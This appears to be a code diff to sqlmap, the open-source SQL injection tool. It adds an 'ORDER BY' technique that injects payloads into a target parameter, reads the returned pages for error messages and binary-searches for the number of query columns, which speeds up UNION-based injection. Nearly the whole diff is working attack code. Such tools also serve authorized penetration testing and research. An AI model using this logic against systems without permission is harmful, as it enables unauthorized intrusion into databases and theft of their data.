@@ -21,8 +21,10 @@ from lib.core.common import getUnicode
 from lib.core.common import listToStrValue
 from lib.core.common import popValue
 from lib.core.common import pushValue
+from lib.core.common import randomInt
 from lib.core.common import randomStr
 from lib.core.common import removeReflectiveValues
+from lib.core.common import singleTimeLogMessage
 from lib.core.common import singleTimeWarnMessage
 from lib.core.common import stdev
 from lib.core.common import wasLastRequestDBMSError
@@ -39,6 +41,7 @@ from lib.core.settings import MIN_RATIO
 from lib.core.settings import MAX_RATIO
 from lib.core.settings import MIN_STATISTICAL_RANGE
 from lib.core.settings import MIN_UNION_RESPONSES
+from lib.core.settings import ORDER_BY_STEP
 from lib.core.unescaper import unescaper
 from lib.parse.html import htmlParser
 from lib.request.comparison import comparison
@@ -50,10 +53,52 @@ def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where
     """
     retVal = None
 
+    def __orderByTechnique():
+        def __orderByTest(cols):
+            query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
+            query = agent.suffixQuery(query, suffix=suffix, comment=comment)
+            payload = agent.payload(newValue=query, place=place, parameter=parameter, where=where)
+            page, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
+            return not re.search(r"((warning|error)[^\n]*order)|(order by)", page or "", re.I)
+
+        if __orderByTest(1) and not __orderByTest(randomInt()):
+            infoMsg = "ORDER BY technique seems to be usable. "
+            infoMsg += "this should dramatically reduce the "
+            infoMsg += "time needed to find the right number "
+            infoMsg += "of query columns. Automatically extending the "
+            infoMsg += "range for UNION query injection technique"
+            singleTimeLogMessage(infoMsg)
+
+            lowCols, highCols = 1, ORDER_BY_STEP
+            found = None
+            while not found:
+                if __orderByTest(highCols):
+                    lowCols = highCols
+                    highCols += ORDER_BY_STEP
+                else:
+                    while not found:
+                        mid = highCols - (highCols - lowCols) / 2
+                        if __orderByTest(mid):
+                            lowCols = mid
+                        else:
+                            highCols = mid
+                        if (highCols - lowCols) < 2:
+                            found = lowCols
+
+            return found
+
     pushValue(kb.errorIsNone)
     items, ratios = [], []
     kb.errorIsNone = False
     lowerCount, upperCount = conf.uColsStart, conf.uColsStop
+
+    if lowerCount == 1:
+        found = kb.orderByColumns or __orderByTechnique()
+        if found:
+            kb.orderByColumns = found
+            infoMsg = "target url appears to have %d columns in query" % found
+            singleTimeLogMessage(infoMsg)
+            return found
 
     if abs(upperCount - lowerCount) < MIN_UNION_RESPONSES:
         upperCount = lowerCount + MIN_UNION_RESPONSES
